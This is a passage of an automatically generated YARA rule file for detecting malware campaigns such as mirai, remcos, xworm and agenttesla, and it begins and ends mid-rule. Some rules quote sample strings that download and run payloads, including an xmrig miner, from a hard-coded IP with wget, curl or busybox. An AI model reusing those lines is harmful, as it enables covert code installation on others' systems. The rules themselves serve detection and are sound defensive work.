        $s2 = "$NT Shutdown: OpenProcessToken error.)NT Shutdown: AdjustTokenPrivileges error.!NT Shutdown: ExitWin" wide
        $s3 = "/T:<full path> -- Specifies temporary working folder," wide
        $s4 = "            <supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"/>" ascii
        $s5 = "    <!-- This Id value indicates the application supports Windows Blue/Server 2012 R2 functionality-" ascii
        $s6 = "            <supportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/>" ascii
        $s7 = "    <compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\"> " ascii
        $s8 = "rundll32.exe %sadvpack.dll,DelNodeRunDLL32 \"%s\"" ascii
        $s9 = "/C:<Cmd> -- Override Install Command defined by author." wide
        $s10 = "            <supportedOS Id=\"{e2011457-1546-43c5-a5fe-008deee3d3f0}\"/> " ascii
        $s11 = "rundll32.exe %s,InstallHinfSection %s 128 %s" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 25165824 and 12 of them
}

rule Sightlines_rich_header_hash_2a6cf275_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign rich_header_hash-2a6cf275"
        date = "2026-10-22"
        campaign = "rich_header_hash-2a6cf275"
        family = ""
        hash = "16c31ad3c6f484a172280b83c15d81e5062cf504444d13af7af3e31ab7a96bae"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/rich_header_hash-2a6cf275.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:as" ascii
        $s1 = "m.v1\" manifestVersion=\"1.0\"><assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"*\" name=\"Null" ascii
        $s2 = "\\Microsoft\\Internet Explorer\\Quick Launch" wide
        $s3 = "Installer integrity check has failed. Common causes include" wide
        $s4 = "Error writing temporary file. Make sure your temp folder is valid." wide
        $s5 = "Software\\Microsoft\\Windows\\CurrentVersion" wide
        $s6 = "installer's author to obtain a new copy." wide
        $s7 = "incomplete download and damaged media. Contact the" wide
        $s8 = ".DEFAULT\\Control Panel\\International" wide
        $s9 = "Control Panel\\Desktop\\ResourceLocale" wide
        $s10 = "http://nsis.sf.net/NSIS_Error" wide
        $s11 = "verifying installer: %d%%" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 12792758 and 12 of them
}

rule Sightlines_tlsh_ab89c663_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-ab89c663"
        date = "2026-10-22"
        campaign = "tlsh-ab89c663"
        family = "mirai"
        hash = "04bdee4f273e2b4d2e1f05c9babfd772f19f7f92eadb6221c42254d683ee2963"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-ab89c663.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "1u1$)&u+17u)qdE" ascii
        $s1 = "wq\"x{JDJK" ascii
        $s2 = "-0+1prp|" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 3 of them
}

rule Sightlines_tlsh_8cfbe6a7_formbook
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-8cfbe6a7"
        date = "2026-10-22"
        campaign = "tlsh-8cfbe6a7"
        family = "formbook"
        hash = "29215ad7f765f085a93eebf9be3fc2a1c80e38c897b88a92d4b9467bdefc8dd0"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-8cfbe6a7.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Week {0} [CRITICAL ALERT]: Equipment malfunction detected! Nitrate spiked and stress occurred." wide
        $s1 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s2 = "Turnover & Flow: 32.9x | Rating: Exemplary" wide
        $s3 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s4 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s5 = "C | Alk 8.6 dKH | Ca 425 ppm | Phase: Pristine" wide
        $s6 = "Dynamic Reef Cross-Section & Sump Ecosystem" wide
        $s7 = "Turnover & Flow: {0:F1}x | Rating: {1}" wide
        $s8 = "KMicrosoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator" ascii
        $s9 = "Week 0: Aquarium baseline re-initialized." wide
        $s10 = "Saltwater Aquarium - Reef Section & Sump Station" wide
        $s11 = "Amphiprion ocellaris, Zebrasoma flavescens" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1673216 and 12 of them
}

rule Sightlines_host_36996cf5_phorpiex
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign host-36996cf5"
        date = "2026-10-22"
        campaign = "host-36996cf5"
        family = "phorpiex"
        hash = "1b650dc35f75c9b962c54dfd1cacd9bbedf8708a4870218c4bbb07a76b4d1ba3"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/host-36996cf5.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.VC90.CRT\" version=\"9.0.21022.8\" processorArchit" ascii
        $s1 = "GPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDING" ascii
        $s2 = "%s:Zone.Identifier" wide
        $s3 = "__wgetmainargs" ascii
        $s4 = "MSVCR90.dll" ascii
        $s5 = "%appdata%" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 5 of them
}

rule Sightlines_tlsh_c6c31d76_remcos
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-c6c31d76"
        date = "2026-10-22"
        campaign = "tlsh-c6c31d76"
        family = "remcos"
        hash = "0232bf46ac0ed7b952249aa160285de7c05ceac0447a39ff5a9c0939192ae4d8"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-c6c31d76.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "'' SIG '' gjcCAR4wJAIBAQQQTvApFpkntU2P5azhDxfrqwIBAAIB" ascii
        $s1 = "antikvarboghandlersincomp = MidB(\"Sonambulisternes\", 164, 134)" ascii
        $s2 = "Cytoreticulumdi157 = Replace(\"Taiwanske\",\"Aefaldy172\",\"Melaenic\")" ascii
        $s3 = "Kiesternonverminouslybal = Replace(\"Connexure77\",\"Udbytterigst255\",\"Expostulated\")" ascii
        $s4 = "Rem Systemgrafers182, etholog: outwinds skummedes172? spartacide;" ascii
        $s5 = "Rem Apyrous. citha! pil sponsorskab235, gasarten138!" ascii
        $s6 = "Rem Udskiftningsspilleres200 angivere67 paraffinlyss, cherubim dashikis175:" ascii
        $s7 = "Siriassvarmulighedsmensur = Replace(\"Desultorious\",\"Underkendt\",\"beblotch\")" ascii
        $s8 = "Rem Algorithmic: unexpressably wharfland;" ascii
        $s9 = "Rem Udetj. kvikslv140 subintentionally, lyseslukkeren: babuls239." ascii
        $s10 = "Rem Indboforsikringernes. candiel: ridderhatte. multiphastic59! hyalography" ascii
        $s11 = "Rem Blackburn stenotypist145: sover; nontypographically" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_c379773e_xworm
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-c379773e"
        date = "2026-10-22"
        campaign = "tlsh-c379773e"
        family = "xworm"
        hash = "3d3362f1bd817c6c92aea1a2f3245ffa792c039803c0694319a8adcca57fbf0c"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-c379773e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s1 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s2 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s3 = "Content-Type: application/x-www-form-urlencoded" wide
        $s4 = "4System.Web.Services.Protocols.SoapHttpClientProtocol" ascii
        $s5 = "SELECT * FROM Win32_VideoController" wide
        $s6 = "-ExecutionPolicy Bypass -File \"" wide
        $s7 = "Win32_Processor.deviceid=\"CPU0\"" wide
        $s8 = "Select * from AntivirusProduct" wide
        $s9 = "m_MyWebServicesObjectProvider" ascii
        $s10 = "OfflineKeylogger Not Enabled" wide
        $s11 = "ThreadSafeObjectProvider`1" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_41ec346c_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-41ec346c"
        date = "2026-10-22"
        campaign = "tlsh-41ec346c"
        family = ""
        hash = "855dc4b6ae1f10a5bb4d7ee450e536020fe495079f1a2f1b39a334ec03a68150"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-41ec346c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "1u1$)&u+17u)qdE" ascii
        $s1 = "wq\"x{JDJK" ascii
        $s2 = "TKih8Lkh8" ascii
        $s3 = "-0+1prp|" ascii
        $s4 = "kjk8Ki(8" ascii
        $s5 = "Lih8mih8" ascii
        $s6 = "hi8+hi8_" ascii
        $s7 = "lih8Mih8" ascii
        $s8 = "jjj8*i(8" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 7 of them
}

rule Sightlines_tlsh_685a7e67_snowlight
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-685a7e67"
        date = "2026-10-21"
        campaign = "tlsh-685a7e67"
        family = "snowlight"
        hash = "b10b0a0544ca487803814a5570cc32b337a9e30a9abcd7984534c30070c4763b"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-685a7e67.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "__do_global_dtors_aux_fini_array_entry" ascii
        $s1 = "__libc_start_main@@GLIBC_2.0" ascii
        $s2 = "gethostbyname@@GLIBC_2.0" ascii
        $s3 = "_ITM_deregisterTMCloneTable" ascii
        $s4 = "__frame_dummy_init_array_entry" ascii
        $s5 = "_ITM_registerTMCloneTable" ascii
        $s6 = "setsockopt@@GLIBC_2.0" ascii
        $s7 = "__i686.get_pc_thunk.bx" ascii
        $s8 = "inet_addr@@GLIBC_2.0" ascii
        $s9 = "__environ@@GLIBC_2.0" ascii
        $s10 = "realpath@@GLIBC_2.3" ascii
        $s11 = "deregister_tm_clones" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_50a09960_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-50a09960"
        date = "2026-10-22"
        campaign = "imphash-50a09960"
        family = ""
        hash = "0be1298198e9ba2fa22ddcd6f1f0ef4f239d97ec0767e0ba083ae97bcc18945f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-50a09960.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "LuaJIT 2.1.0-beta3 -- Copyright (C) 2005-2017 Mike Pall. http://luajit.org/" ascii
        $s1 = "bad FPU precision (use D3DCREATE_FPU_PRESERVE with DirectX)" ascii
        $s2 = "JIT compiler disabled, CPU does not support SSE2" ascii
        $s3 = "  -O[opt]   Control LuaJIT optimizations." ascii
        $s4 = "unknown or malformed optimization flag '%s'" ascii
        $s5 = "unknown luaJIT command or jit.* modules not installed" ascii
        $s6 = "PANIC: unprotected error in call to Lua API (" ascii
        $s7 = "ambiguous syntax (function call x new statement)" ascii
        $s8 = "<goto %s> jumps into the scope of local '%s'" ascii
        $s9 = "attempt to yield across C-call boundary" ascii
        $s10 = "  -j cmd    Perform LuaJIT control command." ascii
        $s11 = "NYI: cannot call this C function (yet)" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1756160 and 12 of them
}

rule Sightlines_tlsh_f4d4c610_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-f4d4c610"
        date = "2026-10-22"
        campaign = "tlsh-f4d4c610"
        family = ""
        hash = "0141e546ec16e5a2d0aac816932506aca117c3c59c7cc4d933441e1f92267079"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-f4d4c610.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "bad FPU precision (use D3DCREATE_FPU_PRESERVE with DirectX)" ascii
        $s1 = "  -O[opt]   Control LuaJIT optimizations." ascii
        $s2 = "unknown or malformed optimization flag '%s'" ascii
        $s3 = "unknown luaJIT command or jit.* modules not installed" ascii
        $s4 = "PANIC: unprotected error in call to Lua API (" ascii
        $s5 = "ambiguous syntax (function call x new statement)" ascii
        $s6 = "<goto %s> jumps into the scope of local '%s'" ascii
        $s7 = "attempt to yield across C-call boundary" ascii
        $s8 = "  -j cmd    Perform LuaJIT control command." ascii
        $s9 = "NYI: cannot call this C function (yet)" ascii
        $s10 = "wrong number of arguments for function call" ascii
        $s11 = "runtime code generation failed, restricted kernel?" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1520640 and 12 of them
}

rule Sightlines_tlsh_1d317e3f_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-1d317e3f"
        date = "2026-10-22"
        campaign = "tlsh-1d317e3f"
        family = ""
        hash = "085147fb40495ff1320a31165c7d0f3232ca577c0cd9e7ab359ef17e9252de26"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-1d317e3f.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "=http://31.56.209.86/%s;(wget -qO .upd $U||curl -skLo .upd $U||busybox wget -qO .upd $U);chmod 777 ." ascii
        $s1 = "http://31.56.209.86/xmrig_%s;(wget -qO .xm $U||curl -so .xm $U||busybox wget -qO .xm $U); chmod 777 " ascii
        $s2 = "<!doctype html><meta charset=utf-8><title>guardian proxy</title><style>body{background:#111;color:#0" ascii
        $s3 = "<!doctype html><meta charset=utf-8><title>guardian proxy</title><style>body{background:#0b0b0b;color" ascii
        $s4 = ":#5f5;font-family:monospace}table{border-collapse:collapse}td,th{border:1px solid #333;padding:4px 8" ascii
        $s5 = "px}a{color:#5ff}</style><h2>guardian proxy control</h2><p>uptime %lds | total %d | active %d | ping " ascii
        $s6 = "f0;font-family:monospace}</style><h2>guardian proxy panel</h2><form method=post action=/login>passwo" ascii
        $s7 = "Set-Cookie: sid=%s; Path=/; Max-Age=%d; HttpOnly" ascii
        $s8 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s9 = "%dms | proxy users %d</p><p>proxy: <b>socks5 :%d</b> (same port as panel)</p><h3>connected clients (" ascii
        $s10 = "rd: <input type=password name=password><input type=submit value=login></form><p>protected: brute-for" ascii
        $s11 = "t value='add proxy account'></form><form method=post action=/removeuser>user <input name=user size=8" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_964cee94_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-964cee94"
        date = "2026-10-22"
        campaign = "tlsh-964cee94"
        family = ""
        hash = "a4c09192b90b028011e09825541147c0f2478e7899cd6cbfcb19decdc446e89e"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-964cee94.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "1u1$)&u+17u)qdE" ascii
        $s1 = "D$4jPj#UW" ascii
        $s2 = "t$(RRUVRj" ascii
        $s3 = "-0+1prp|" ascii
        $s4 = "D$\\3D$Lx" ascii
        $s5 = "D$d3D$,x" ascii
        $s6 = "L$(3L$Lx" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 7 of them
}

rule Sightlines_tlsh_ae5eb87f_agenttesla
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-ae5eb87f"
        date = "2026-10-21"
        campaign = "tlsh-ae5eb87f"
        family = "agenttesla"
        hash = "6772c041440cf1f4fb5e6590bfd3e5902a6080aa46e4131277f22f33ca702e32"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-ae5eb87f.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = " \"$&(*,.02468:<>@BDFHJLNPRTVXZ\\^`bdfhjlnprtvxz|~" ascii
        $s1 = "      <activeCodePage xmlns=\"http://schemas.microsoft.com/SMI/2019/WindowsSettings\">UTF-8</activeCod" ascii
        $s2 = "80},\"CardTableInfo\":{\"!\":24,\"Recount\":0,\"Size\":8,\"NextCardTable\":16},\"RegionFreeList\":{\"!\":56,\"HeadF" ascii
        $s3 = "served\":16,\"Allocated\":24,\"GcIndex\":32,\"Fgm\":40,\"Size\":48,\"AvailablePagefileMb\":56,\"LohP\":64},\"Handl" ascii
        $s4 = "4,\"Mem\":32,\"Flags\":40,\"Next\":48,\"BackgroundAllocated\":56},\"OomHistory\":{\"Reason\":0,\"AllocSize\":8,\"Re" ascii
        $s5 = "egionKinds\":\"0x3\",\"GCHeapMarkArray\":[[1],\"pointer\"],\"GCHeapNextSweepObj\":[[2],\"pointer\"],\"GCHeapBack" ascii
        $s6 = "},\"TableSegment\":{\"NextSegment\":1998,\"RgAllocation\":480,\"RgTail\":1920,\"RgValue\":4096,\"RgUserData\":16" ascii
        $s7 = "ismBitsLength\":\"0x2\",\"GlobalMechanismsLength\":\"0x6\",\"InitialHandleTableArraySize\":\"0xa\",\"DebugDestro" ascii
        $s8 = "alTypes\":\"0xd\",\"HandlesPerBlock\":\"0x40\",\"BlockInvalid\":\"0xff\",\"CardTableInfoSize\":\"0x18\",\"CountFreeR" ascii
        $s9 = "groundMinSavedAddr\":[[3],\"pointer\"],\"GCHeapBackgroundMaxSavedAddr\":[[4],\"pointer\"],\"GCHeapAllocAlloc" ascii
        $s10 = "ExpandMechanisms\":[[13],\"pointer\"],\"GCHeapInterestingMechanismBits\":[[14],\"pointer\"],\"GCHeapFreeable" ascii
        $s11 = "  <assemblyIdentity type=\"win32\" name=\"Citrine.DesktopUtility\" version=\"3.2.0.0\" processorArchitectu" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 4482948 and 12 of them
}

rule Sightlines_tlsh_31a94ddb_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-31a94ddb"
        date = "2026-10-21"
        campaign = "tlsh-31a94ddb"
        family = ""
        hash = "2261c63c17c6ae904a419f98f51a8fd7607a3a0a952d87c4e85c36aaea158387"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-31a94ddb.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/usr/lib/libSystem.B.dylib" ascii
        $s1 = "_realpath$DARWIN_EXTSN" ascii
        $s2 = "ws_stager_darwin_arm64" ascii
        $s3 = "__mh_execute_header" ascii
        $s4 = "___stack_chk_guard" ascii
        $s5 = "___chkstk_darwin" ascii
        $s6 = "___stack_chk_fail" ascii
        $s7 = "/tmp/log_de.log" ascii
        $s8 = "_gethostbyname" ascii
        $s9 = "/tmp/.X1-unix" ascii
        $s10 = "___sprintf_chk" ascii
        $s11 = "[kworker/0:2]" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_1dcf6ece_coinminer
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-1dcf6ece"
        date = "2026-10-22"
        campaign = "tlsh-1dcf6ece"
        family = "coinminer"
        hash = "5ac1dd086e6a9daa69b7c44d0820ea16e93dc0cd34392cacda3de6a9aa3c3104"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-1dcf6ece.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "com/sun/jna/platform/win32/WinCrypt$CRYPT_ALGORITHM_IDENTIFIER$ByReference.classPK" ascii
        $s1 = "com/sun/jna/platform/win32/WinCrypt$CERT_STRONG_SIGN_SERIALIZED_INFO$ByReference.classPK" ascii
        $s2 = "com/sun/jna/platform/win32/HighLevelMonitorConfigurationAPI$MC_DISPLAY_TECHNOLOGY_TYPE$ByReference.c" ascii
        $s3 = "com/sun/jna/platform/win32/Winevt$EVT_CHANNEL_CONFIG_PROPERTY_ID.classPK" ascii
        $s4 = "com/sun/jna/platform/win32/WinCrypt$CERT_STRONG_SIGN_PARA$DUMMYUNION.classPK" ascii
        $s5 = "com/sun/jna/platform/win32/Winevt$EVT_SUBSCRIBE_NOTIFY_ACTION.classPK" ascii
        $s6 = "com/sun/jna/platform/win32/HighLevelMonitorConfigurationAPI$MC_DISPLAY_TECHNOLOGY_TYPE.classPK" ascii
        $s7 = "com/sun/jna/platform/win32/WinCrypt$CERT_CHAIN_POLICY_STATUS$ByReference.classPK" ascii
        $s8 = "com/sun/jna/platform/win32/Winsvc$SERVICE_FAILURE_ACTIONS$ByReference.classPK" ascii
        $s9 = "com/sun/jna/platform/win32/WinCrypt$CRYPT_ALGORITHM_IDENTIFIER.classPK" ascii
        $s10 = "com/sun/jna/platform/win32/COM/Wbemcli$WBEM_CONDITION_FLAG_TYPE.classPK" ascii
        $s11 = "com/sun/jna/platform/win32/Winevt$EVT_PUBLISHER_METADATA_PROPERTY_ID.classPK" ascii
    condition:
        filesize < 7954246 and 12 of them
}

rule Sightlines_imphash_4013fc57_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-4013fc57"
        date = "2026-10-22"
        campaign = "imphash-4013fc57"
        family = ""
        hash = "03a6e069a3af6c9905293868668280bac89d024e00c99e4313515a4f5f038401"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-4013fc57.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "bad FPU precision (use D3DCREATE_FPU_PRESERVE with DirectX)" ascii
        $s1 = "JIT compiler disabled, CPU does not support SSE2" ascii
        $s2 = "unknown or malformed optimization flag '%s'" ascii
        $s3 = "PANIC: unprotected error in call to Lua API (" ascii
        $s4 = "Must use luaL_newstate() for 64 bit target" ascii
        $s5 = "ambiguous syntax (function call x new statement)" ascii
        $s6 = "<goto %s> jumps into the scope of local '%s'" ascii
        $s7 = "attempt to yield across C-call boundary" ascii
        $s8 = "NYI: cannot call this C function (yet)" ascii
        $s9 = "wrong number of arguments for function call" ascii
        $s10 = "runtime code generation failed, restricted kernel?" ascii
        $s11 = "attempt to perform arithmetic on '%s' and '%s'" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_f2cc54d3_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-f2cc54d3"
        date = "2026-10-22"
        campaign = "tlsh-f2cc54d3"
        family = ""
        hash = "1f546f1b4b2cd404fdd2ba9b52223ecf935ad26588993f703bef69db4c94034e"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-f2cc54d3.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "LuaJIT 2.1.0-beta3 -- Copyright (C) 2005-2017 Mike Pall. http://luajit.org/" ascii
        $s1 = "  -O[opt]   Control LuaJIT optimizations." ascii
        $s2 = "unknown luaJIT command or jit.* modules not installed" ascii
        $s3 = "  -j cmd    Perform LuaJIT control command." ascii
        $s4 = "  -i        Enter interactive mode after executing 'script'." ascii
        $s5 = "  -         Execute stdin and stop handling options." ascii
        $s6 = "  -E        Ignore environment variables." ascii
        $s7 = "cannot create state: not enough memory" ascii
        $s8 = "  -e chunk  Execute string 'chunk'." ascii
        $s9 = "  -v        Show version information." ascii
        $s10 = "  -l name   Require library 'name'." ascii
        $s11 = "(error object is not a string)" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_484af3db_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-484af3db"
        date = "2026-10-22"
        campaign = "tlsh-484af3db"
        family = ""
        hash = "0b24132bc1794daf323a3ce5ae8f5f14de7a161ab778fa89192514aa1b6966cf"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-484af3db.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "function FindProxyForURL(url,host) {return \"DIRECT\";}" wide
        $s1 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s2 = "WPADAuth value must be Anonymous, Basic, NTLM, or NTLMNoESS" wide
        $s3 = "DNSHost must be specified and fully qualified when using DNSTypes SOA or SRV" wide
        $s4 = "HTTPAuth value must be Anonymous, Basic, NTLM, or NTLMNoESS" wide
        $s5 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s6 = "ProxyAuth value must be Basic, NTLM, or NTLMNoESS" wide
        $s7 = " -WPADAuth                Default = NTLM: (Anonymous/Basic/NTLM/NTLMNoESS) HTTP/HTTPS listener authe" wide
        $s8 = " -MachineAccounts         Default = Disabled: (Y/N) Enable/Disable showing NTLM challenge/response c" wide
        $s9 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s10 = "[-] Error starting unprivileged {1} listener, check IP and port usage." wide
        $s11 = " -HTTPAuth                Default = NTLM: (Anonymous/Basic/NTLM/NTLMNoESS) HTTP/HTTPS listener authe" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_8ae6d067_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-8ae6d067"
        date = "2026-10-22"
        campaign = "imphash-8ae6d067"
        family = ""
        hash = "072960b06dcec0b5d0991f98ff8b6bb90aa75ec4d0bf3ed7f58f1984ebc1dea4"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-8ae6d067.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "GCC: (MinGW-W64 x86_64-ucrt-posix-seh, built by Brecht Sanders, r1) 16.2.0" ascii
        $s1 = "  <asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/SMI/2016/WindowsSettings\">" ascii
        $s2 = " <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s3 = "    <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" ascii
        $s4 = "The result is too small to be represented (UNDERFLOW)" ascii
        $s5 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." ascii
        $s6 = "   <longPathAware>true</longPathAware>" ascii
        $s7 = "Partial loss of significance (PLOSS)" ascii
        $s8 = "Total loss of significance (TLOSS)" ascii
        $s9 = "api-ms-win-crt-private-l1-1-0.dll" ascii
        $s10 = "Overflow range error (OVERFLOW)" ascii
        $s11 = "Argument domain error (DOMAIN)" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 18874368 and 12 of them
}

rule Sightlines_tlsh_cbdc30f7_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-cbdc30f7"
        date = "2026-10-22"
        campaign = "tlsh-cbdc30f7"
        family = ""
        hash = "5f8f3d29de1ba59a484e984ea8f3e3d013c5aa903229a7a3aa121b506d64a6b8"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-cbdc30f7.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "=http://31.56.209.86/%s;(wget -qO .upd $U||curl -skLo .upd $U||busybox wget -qO .upd $U);chmod 777 ." ascii
        $s1 = "http://31.56.209.86/xmrig_%s;(wget -qO .xm $U||curl -so .xm $U||busybox wget -qO .xm $U); chmod 777 " ascii
        $s2 = "<!doctype html><meta charset=utf-8><title>guardian proxy</title><style>body{background:#111;color:#0" ascii
        $s3 = "<!doctype html><meta charset=utf-8><title>guardian proxy</title><style>body{background:#0b0b0b;color" ascii
        $s4 = ":#5f5;font-family:monospace}table{border-collapse:collapse}td,th{border:1px solid #333;padding:4px 8" ascii
        $s5 = "px}a{color:#5ff}</style><h2>guardian proxy control</h2><p>uptime %lds | total %d | active %d | ping " ascii
        $s6 = "f0;font-family:monospace}</style><h2>guardian proxy panel</h2><form method=post action=/login>passwo" ascii
        $s7 = "Set-Cookie: sid=%s; Path=/; Max-Age=%d; HttpOnly" ascii
        $s8 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s9 = "%dms | proxy users %d</p><p>proxy: <b>socks5 :%d</b> (same port as panel)</p><h3>connected clients (" ascii
        $s10 = "rd: <input type=password name=password><input type=submit value=login></form><p>protected: brute-for" ascii
        $s11 = "t value='add proxy account'></form><form method=post action=/removeuser>user <input name=user size=8" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_a5222893_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-a5222893"
        date = "2026-10-22"
        campaign = "tlsh-a5222893"
        family = ""
        hash = "6b9df966d5f851687534c1abae51e4287c91484fa5aa6dc45e89ebb8368a02e7"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-a5222893.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "0x164},H=a0y;return'webdriver'in window||!!a0X[H(a0z.M)];},'userAgentCheck':function(){var a0Y={M:0x" ascii
